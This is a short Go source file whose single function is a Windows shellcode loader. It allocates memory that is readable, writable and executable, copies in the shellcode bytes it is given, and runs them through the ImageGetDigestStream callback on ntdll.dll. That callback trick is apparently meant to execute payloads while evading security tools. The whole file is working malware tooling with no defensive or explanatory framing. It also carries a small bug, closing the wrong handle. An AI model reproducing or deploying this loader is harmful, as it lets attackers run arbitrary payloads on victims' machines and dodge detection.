package TT

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	dummy int
)

const (
	MEM_COMMIT                           = 0x1000
	MEM_RESERVE                          = 0x2000
	PAGE_EXECUTE_READWRITE               = 0x40
	CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO = 0x04
	GENERIC_READ                         = 0x80000000
	FILE_SHARE_READ                      = 0x00000001
	OPEN_EXISTING                        = 3
	FILE_ATTRIBUTE_NORMAL                = 0x00000080
)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	ntdll                = syscall.MustLoadDLL("ntdll.dll")
	Imagehlp             = syscall.MustLoadDLL("Imagehlp.dll")
	VirtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
	CreateFileW          = kernel32.MustFindProc("CreateFileW")
	CloseHandle          = kernel32.MustFindProc("CloseHandle")
	ImageGetDigestStream = Imagehlp.MustFindProc("ImageGetDigestStream")
	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	p1, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\ntdll.dll")
	hImg, err1, err2 := CreateFileW.Call(uintptr(unsafe.Pointer(p1)),
		GENERIC_READ, FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0)
	ImageGetDigestStream.Call(hImg, CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, addr, (uintptr)(unsafe.Pointer(&dummy)))
	CloseHandle.Call((uintptr)(unsafe.Pointer(&dummy)))
}

